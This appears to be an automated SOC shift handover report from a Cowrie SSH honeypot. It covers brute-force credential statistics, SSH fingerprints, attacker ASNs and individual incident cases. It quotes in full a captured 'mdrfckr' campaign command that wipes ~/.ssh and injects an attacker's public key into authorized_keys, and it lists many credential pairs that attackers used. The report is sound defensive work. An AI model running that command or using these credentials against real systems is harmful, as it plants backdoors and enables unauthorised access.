# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-16 |
| **Generated At** | 2026-07-16T14:03:02Z |
| **Shift Time** | 14:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **294** |
| Confirmed Threats | **253** |
| False Positives Filtered | **41** (14.0%) |
| Unique Attacker IPs | **126** |
| Countries of Origin | **36** |
| High Severity Cases | **133** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **161** |
| Malware Samples Analyzed | **4** HIGH · **32** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **168** |
| Unique Credential Pairs | **86** |
| Unique Usernames | **44** |
| Unique Passwords | **71** |
| Successful Auth Pairs | **131** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `support` | 14 |
| `user` | 8 |
| `default` | 8 |
| `debian` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 12 |
| `smo@@kkklss` | 8 |
| `qwerty123` | 7 |
| `123456` | 7 |
| `123@@@` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 12 |
| `root` | `smo@@kkklss` | 8 |
| `root` | `123@@@` | 6 |
| `root` | `LeitboGi0ro` | 6 |
| `default` | `4444444444` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-07-16T08:57:15 |
| `user` | `1q2w3e4r` | `103.121.27.218` | 2026-07-16T08:57:31 |
| `support` | `support` | `10.0.0.73` | 2026-07-16T08:58:34 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-16T08:58:42 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-16T08:58:42 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-16T08:58:51 |
| `user` | `1q2w3e4r` | `210.4.68.72` | 2026-07-16T09:01:01 |
| `user` | `1q2w3e4r` | `10.0.0.73` | 2026-07-16T09:01:21 |
| `ps` | `1` | `10.0.0.73` | 2026-07-16T09:03:51 |
| `sridhar` | `sridhar` | `43.157.163.155` | 2026-07-16T09:04:41 |
| `345gs5662d34` | `345gs5662d34` | `43.157.163.155` | 2026-07-16T09:04:44 |
| `sridhar` | `3245gs5662d34` | `43.157.163.155` | 2026-07-16T09:04:45 |
| `ps` | `1` | `185.242.3.195` | 2026-07-16T09:06:48 |
| `debian` | `letmein` | `188.219.104.210` | 2026-07-16T09:10:01 |
| `debian` | `letmein` | `182.135.63.175` | 2026-07-16T09:10:10 |
| `debian` | `letmein` | `10.0.0.73` | 2026-07-16T09:10:33 |
| `admin` | `password01!` | `117.211.15.106` | 2026-07-16T09:19:22 |
| `admin` | `password01!` | `196.189.126.10` | 2026-07-16T09:19:36 |
| `admin` | `password01!` | `10.0.0.73` | 2026-07-16T09:19:50 |
| `user` | `user55` | `65.20.251.41` | 2026-07-16T09:25:51 |
| `user` | `user55` | `27.39.130.144` | 2026-07-16T09:26:03 |
| `user` | `user55` | `10.0.0.73` | 2026-07-16T09:26:15 |
| `root` | `root2001` | `10.0.0.73` | 2026-07-16T09:35:41 |
| `default` | `Default2020` | `46.101.9.55` | 2026-07-16T09:41:08 |
| `root` | `Huawei@123` | `185.242.3.195` | 2026-07-16T09:41:19 |
| `root` | `adminserver` | `103.61.122.229` | 2026-07-16T09:43:47 |
| `default` | `Default2020` | `10.0.0.73` | 2026-07-16T09:44:50 |
| `public` | `public` | `62.201.228.210` | 2026-07-16T09:47:30 |
| `root` | `Huawei@123` | `10.0.0.73` | 2026-07-16T09:54:37 |
| `root` | `qwerty123` | `61.185.30.170` | 2026-07-16T09:57:11 |
| `root` | `qwerty123` | `188.226.132.113` | 2026-07-16T09:57:17 |
| `root` | `qwerty123` | `10.0.0.73` | 2026-07-16T10:00:49 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-16T10:09:22 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-16T10:09:22 |
| `user` | `public` | `187.8.120.90` | 2026-07-16T10:09:33 |
| `support` | `p@ssword` | `10.0.0.73` | 2026-07-16T10:16:25 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `45.79.128.205` | 2026-07-16T10:21:43 |
| `git` | `123456` | `181.212.174.164` | 2026-07-16T10:25:43 |
| `git` | `123456` | `111.70.23.240` | 2026-07-16T10:25:56 |
| `git` | `123456` | `10.0.0.73` | 2026-07-16T10:26:12 |
| `root` | `qwerty12345` | `103.67.152.201` | 2026-07-16T10:31:21 |
| `root` | `qwerty12345` | `119.152.102.54` | 2026-07-16T10:31:33 |
| `ubuntu` | `qwe!!` | `185.242.3.195` | 2026-07-16T10:32:04 |
| `root` | `qwerty12345` | `10.0.0.73` | 2026-07-16T10:34:56 |
| `default` | `4444444444` | `189.56.0.19` | 2026-07-16T10:37:39 |
| `default` | `4444444444` | `34.29.104.32` | 2026-07-16T10:37:46 |
| `default` | `4444444444` | `101.13.1.58` | 2026-07-16T10:41:04 |
| `default` | `4444444444` | `61.145.181.7` | 2026-07-16T10:41:13 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `47.254.214.117` | 2026-07-16T10:41:17 |
| `default` | `4444444444` | `10.0.0.73` | 2026-07-16T10:41:28 |
| `admin` | `admin` | `8.209.236.13` | 2026-07-16T10:44:25 |
| `ubuntu` | `adminserver` | `103.61.122.229` | 2026-07-16T10:44:40 |
| `ubuntu` | `qwe!!` | `10.0.0.73` | 2026-07-16T10:45:26 |
| `sftp` | `sftp` | `203.198.173.137` | 2026-07-16T10:47:25 |
| `admin` | `server123` | `106.13.39.89` | 2026-07-16T10:56:59 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-16T10:58:13 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-16T10:58:13 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-16T10:58:22 |
| `root` | `r00t` | `59.93.36.136` | 2026-07-16T11:00:03 |
| `root` | `r00t` | `61.169.54.150` | 2026-07-16T11:00:16 |
| `debian` | `123456789` | `201.63.52.54` | 2026-07-16T11:02:43 |
| `debian` | `123456789` | `211.104.166.110` | 2026-07-16T11:02:52 |
| `debian` | `123456789` | `153.37.177.219` | 2026-07-16T11:06:22 |
| `listd` | `54e172662` | `93.241.232.14` | 2026-07-16T11:12:47 |
| `listd` | `54e172662` | `94.200.95.18` | 2026-07-16T11:16:19 |
| `listd` | `54e172662` | `65.20.187.47` | 2026-07-16T11:16:31 |
| `camille` | `camille` | `185.242.3.195` | 2026-07-16T11:23:08 |
| `user` | `12345678` | `10.0.0.73` | 2026-07-16T11:25:37 |
| `vicky` | `vicky` | `3.28.44.14` | 2026-07-16T11:27:02 |
| `345gs5662d34` | `345gs5662d34` | `3.28.44.14` | 2026-07-16T11:27:06 |
| `vicky` | `3245gs5662d34` | `3.28.44.14` | 2026-07-16T11:27:07 |
| `lll` | `lll` | `188.219.104.210` | 2026-07-16T11:27:51 |
| `lll` | `lll` | `221.120.4.61` | 2026-07-16T11:31:31 |
| `camille` | `camille` | `10.0.0.73` | 2026-07-16T11:36:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.132` | 2026-07-16T11:37:12 |
| `test` | `123qwe` | `122.160.142.194` | 2026-07-16T11:38:02 |
| `root` | `Aa147258369` | `115.190.128.221` | 2026-07-16T11:40:47 |
| `test` | `123qwe` | `10.0.0.73` | 2026-07-16T11:41:45 |
| `root` | `adminadmin` | `103.61.122.229` | 2026-07-16T11:44:29 |
| `sol` | `sol` | `2.57.122.238` | 2026-07-16T11:45:56 |
| `solana` | `solana` | `2.57.122.238` | 2026-07-16T11:47:39 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-07-16T11:49:21 |
| `centos` | `qwerty123` | `220.128.137.164` | 2026-07-16T11:50:27 |
| `centos` | `qwerty123` | `113.108.88.121` | 2026-07-16T11:50:41 |
| `centos` | `qwerty123` | `10.0.0.73` | 2026-07-16T11:50:43 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-07-16T11:50:57 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-07-16T11:52:27 |
| `admin` | `dietpi` | `188.226.132.113` | 2026-07-16T11:52:44 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-07-16T11:54:00 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-07-16T11:55:35 |
| `node` | `node` | `2.57.122.238` | 2026-07-16T11:57:06 |
| `node` | `1234` | `2.57.122.238` | 2026-07-16T11:58:40 |
| `node` | `123456` | `2.57.122.238` | 2026-07-16T12:00:16 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-07-16T12:01:58 |
| `root` | `4321` | `200.105.141.172` | 2026-07-16T12:03:28 |
| `eth` | `eth` | `2.57.122.238` | 2026-07-16T12:03:34 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-07-16T12:05:09 |
| `tron` | `tron` | `2.57.122.238` | 2026-07-16T12:06:44 |
| `root` | `4321` | `10.0.0.73` | 2026-07-16T12:07:14 |
| `trx` | `trx` | `2.57.122.238` | 2026-07-16T12:08:19 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-07-16T12:09:52 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-07-16T12:11:25 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-07-16T12:13:03 |
| `root` | `Qwe1!2345` | `185.242.3.195` | 2026-07-16T12:14:23 |
| `solv` | `solv` | `2.57.122.238` | 2026-07-16T12:14:42 |
| `solv` | `1234` | `2.57.122.238` | 2026-07-16T12:16:20 |
| `root` | `sw` | `103.199.16.90` | 2026-07-16T12:16:22 |
| `345gs5662d34` | `345gs5662d34` | `103.199.16.90` | 2026-07-16T12:16:26 |
| `root` | `3245gs5662d34` | `103.199.16.90` | 2026-07-16T12:16:27 |
| `solv` | `123456` | `2.57.122.238` | 2026-07-16T12:17:59 |
| `admin` | `1q2w3e4r!` | `178.178.194.135` | 2026-07-16T12:18:07 |
| `solv` | `12345678` | `2.57.122.238` | 2026-07-16T12:19:41 |
| `postgres` | `123456789` | `160.174.129.232` | 2026-07-16T12:21:15 |
| `345gs5662d34` | `345gs5662d34` | `160.174.129.232` | 2026-07-16T12:21:18 |
| `postgres` | `3245gs5662d34` | `160.174.129.232` | 2026-07-16T12:21:20 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-07-16T12:24:25 |
| `validator` | `validator` | `2.57.122.238` | 2026-07-16T12:26:04 |
| `sol` | `sol123` | `2.57.122.238` | 2026-07-16T12:27:43 |
| `root` | `Qwe1!2345` | `10.0.0.73` | 2026-07-16T12:27:55 |
| `sol` | `123` | `2.57.122.238` | 2026-07-16T12:29:17 |
| `sol` | `12345678` | `2.57.122.238` | 2026-07-16T12:30:58 |
| `unknown` | `P@ssw0rd` | `178.216.165.187` | 2026-07-16T12:31:43 |
| `unknown` | `P@ssw0rd` | `10.0.0.73` | 2026-07-16T12:32:09 |
| `trading` | `trading` | `2.57.122.238` | 2026-07-16T12:32:41 |
| `trader` | `trader` | `2.57.122.238` | 2026-07-16T12:34:21 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-07-16T12:35:56 |
| `ubnt` | `0000` | `218.4.156.254` | 2026-07-16T12:36:53 |
| `bot` | `bot` | `2.57.122.238` | 2026-07-16T12:37:31 |
| `bot` | `123456` | `2.57.122.238` | 2026-07-16T12:39:11 |
| `bot` | `12345` | `2.57.122.238` | 2026-07-16T12:40:47 |
| `ubuntu` | `adminadmin` | `103.61.122.229` | 2026-07-16T12:44:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **294** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 63 |
| OpenSSH | 47 |
| libssh | 25 |
| Paramiko (Python) | 20 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 48 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 42 | 39 |
| `a2de0f306611...` | Mirai/variant | 20 | 3 |
| `f555226df196...` | Mirai/variant | 15 | 7 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 48 | 3 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 42 | 39 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 20 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 15 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 2 | — |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `3.28.44.14`, `115.190.128.221`, `103.199.16.90`, `106.13.39.89`, `160.174.129.232`, `43.157.163.155`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **126** |
| Unique ASNs | **75** |
| High-Risk ASNs | **66** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 11 | HIGH |
| `AS46562` | Performive LLC | 10 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS209334` | Modat B.V. | 3 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (133)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ee638d94f9ff

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 08:57 |
| **Last Seen** | 2026-07-16 08:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:57:15` | `cowrie.session.connect` |
| `2026-07-16 08:57:15` | `cowrie.client.version` |
| `2026-07-16 08:57:15` | `cowrie.client.kex` |
| `2026-07-16 08:57:15` | `cowrie.login.success` |
| `2026-07-16 08:57:16` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:57:16` | `cowrie.direct-tcpip.data` |
| `2026-07-16 08:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f1f9f9f8a53

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-07-16 08:57 |
| **Last Seen** | 2026-07-16 08:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:57:28` | `cowrie.session.connect` |
| `2026-07-16 08:57:28` | `cowrie.client.version` |
| `2026-07-16 08:57:28` | `cowrie.client.kex` |
| `2026-07-16 08:57:31` | `cowrie.login.success` |
| `2026-07-16 08:57:31` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ec6becbad2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 08:58 |
| **Last Seen** | 2026-07-16 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:58:42` | `cowrie.session.connect` |
| `2026-07-16 08:58:42` | `cowrie.client.version` |
| `2026-07-16 08:58:42` | `cowrie.client.kex` |
| `2026-07-16 08:58:42` | `cowrie.login.success` |
| `2026-07-16 08:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ae294c4bc9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 08:58 |
| **Last Seen** | 2026-07-16 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:58:42` | `cowrie.session.connect` |
| `2026-07-16 08:58:42` | `cowrie.client.version` |
| `2026-07-16 08:58:42` | `cowrie.client.kex` |
| `2026-07-16 08:58:42` | `cowrie.login.success` |
| `2026-07-16 08:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770921aeeacc

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 08:58 |
| **Last Seen** | 2026-07-16 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:58:51` | `cowrie.session.connect` |
| `2026-07-16 08:58:51` | `cowrie.client.version` |
| `2026-07-16 08:58:51` | `cowrie.client.kex` |
| `2026-07-16 08:58:51` | `cowrie.login.success` |
| `2026-07-16 08:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-835ecf9a36fb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 08:58 |
| **Last Seen** | 2026-07-16 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:58:52` | `cowrie.session.connect` |
| `2026-07-16 08:58:52` | `cowrie.client.version` |
| `2026-07-16 08:58:52` | `cowrie.client.kex` |
| `2026-07-16 08:58:52` | `cowrie.login.success` |
| `2026-07-16 08:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c90241da7d

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-07-16 09:00 |
| **Last Seen** | 2026-07-16 09:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:00:58` | `cowrie.session.connect` |
| `2026-07-16 09:00:59` | `cowrie.client.version` |
| `2026-07-16 09:00:59` | `cowrie.client.kex` |
| `2026-07-16 09:01:01` | `cowrie.login.success` |
| `2026-07-16 09:01:02` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faebc4b2ce8c

| Field | Detail |
|---|---|
| **Source IP** | `43.157.163[.]155` |
| **First Seen** | 2026-07-16 09:04 |
| **Last Seen** | 2026-07-16 09:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:04:41` | `cowrie.session.connect` |
| `2026-07-16 09:04:41` | `cowrie.client.version` |
| `2026-07-16 09:04:41` | `cowrie.client.kex` |
| `2026-07-16 09:04:41` | `cowrie.login.success` |
| `2026-07-16 09:04:42` | `cowrie.session.params` |
| `2026-07-16 09:04:42` | `cowrie.command.input` |
| `2026-07-16 09:04:42` | `cowrie.command.failed` |
| `2026-07-16 09:04:42` | `cowrie.log.closed` |
| `2026-07-16 09:04:43` | `cowrie.session.params` |
| `2026-07-16 09:04:43` | `cowrie.command.input` |
| `2026-07-16 09:04:43` | `cowrie.session.file_download` |
| `2026-07-16 09:04:43` | `cowrie.log.closed` |
| `2026-07-16 09:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.163[.]155` to AbuseIPDB if not already reported
- [ ] Block `43.157.163[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96e907c62fe

| Field | Detail |
|---|---|
| **Source IP** | `43.157.163[.]155` |
| **First Seen** | 2026-07-16 09:04 |
| **Last Seen** | 2026-07-16 09:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:04:43` | `cowrie.session.connect` |
| `2026-07-16 09:04:43` | `cowrie.client.version` |
| `2026-07-16 09:04:44` | `cowrie.client.kex` |
| `2026-07-16 09:04:44` | `cowrie.login.success` |
| `2026-07-16 09:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.163[.]155` to AbuseIPDB if not already reported
- [ ] Block `43.157.163[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caf5ca17684c

| Field | Detail |
|---|---|
| **Source IP** | `43.157.163[.]155` |
| **First Seen** | 2026-07-16 09:04 |
| **Last Seen** | 2026-07-16 09:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:04:44` | `cowrie.session.connect` |
| `2026-07-16 09:04:44` | `cowrie.client.version` |
| `2026-07-16 09:04:44` | `cowrie.client.kex` |
| `2026-07-16 09:04:45` | `cowrie.login.success` |
| `2026-07-16 09:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.163[.]155` to AbuseIPDB if not already reported
- [ ] Block `43.157.163[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62a58fa2320

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 09:06 |
| **Last Seen** | 2026-07-16 09:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:06:48` | `cowrie.session.connect` |
| `2026-07-16 09:06:48` | `cowrie.client.version` |
| `2026-07-16 09:06:48` | `cowrie.client.kex` |
| `2026-07-16 09:06:48` | `cowrie.login.success` |
| `2026-07-16 09:06:49` | `cowrie.session.params` |
| `2026-07-16 09:06:49` | `cowrie.command.input` |
| `2026-07-16 09:06:49` | `cowrie.log.closed` |
| `2026-07-16 09:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb3aa5abe656

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-16 09:09 |
| **Last Seen** | 2026-07-16 09:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:09:59` | `cowrie.session.connect` |
| `2026-07-16 09:10:00` | `cowrie.client.version` |
| `2026-07-16 09:10:00` | `cowrie.client.kex` |
| `2026-07-16 09:10:01` | `cowrie.login.success` |
| `2026-07-16 09:10:01` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbbb7d40df9c

| Field | Detail |
|---|---|
